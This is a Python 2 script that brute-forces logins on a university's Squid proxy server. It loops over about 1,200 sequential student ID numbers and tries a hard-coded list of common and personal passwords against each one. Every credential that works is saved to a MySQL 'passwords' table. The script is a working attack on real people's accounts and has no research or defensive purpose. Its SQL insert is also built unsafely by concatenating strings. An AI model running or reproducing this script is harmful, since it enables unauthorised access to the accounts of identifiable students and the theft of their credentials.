import urllib2,os,MySQLdb
count=0
# Configure MySQL Connections Here
host="localhost" # MySQL Hostname
user="MYSQL_USERNAME_HERE" # MySQL Username
sqlpass="MYSQL_PASSWORD_HERE" # MySQL password
db = MySQLdb.connect(host,user,sqlpass,"squid")
c = db.cursor()
pas=[" ","rgukt123","space","iiitn","darling","darling143","darling123","rgukt123*","rgukt123$","password","rgukt321","rgukt143","wrongpassword","amma","ammananna","priya","alliswell","iloveyou","ILoveYou","imissyou","missyou","loveyou","143","*","ok","crazy","raviteja","prabhas","amen","786","jesus","jesus123","king","anesh","harshith","harsha","pavan","oye","oy","powerstar","pavankalyan","root","chandu","bujji","haihai","sairam"]
print "[+] Connecting to MySQL Database...."
c.execute("CREATE DATABASE IF NOT EXISTS `squid`;")
c.execute("CREATE TABLE IF NOT EXISTS `passwords` (`uid` varchar(100) NOT NULL,`password` varchar(100) NOT NULL,PRIMARY KEY (`uid`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;")
db.commit()
for i in range(1,1200):
	a="N09"+str(i).zfill(4) # Our University ID Numbers starts with "N09"
	for j in pas:
		proxy=urllib2.ProxyHandler({"http":"http://"+a+":"+j+"@10.1.3.11:3128/"})
		opener=urllib2.build_opener(proxy)
		urllib2.install_opener(opener)
		try:
			html=urllib2.urlopen("http://www.google.com").readlines()
		except urllib2.URLError, e:
			html=["Shit","No","No","407"]
			print "Error : "+a
		if(html[3]=="<title>-:: RGUKT Admin's Message ::-</title>\n" or len(html)==9 or len(html)==18):
			count=count+1
			print "Hurray! You got a Password.\n"
			print "And Count is "+str(count)
			print "Adding password to Database.\n"
			c.execute("INSERT INTO `passwords` (`uid`,`password`) VALUES('"+a+"','"+j+"');")
			print "Added to Database.\n"
			db.commit()
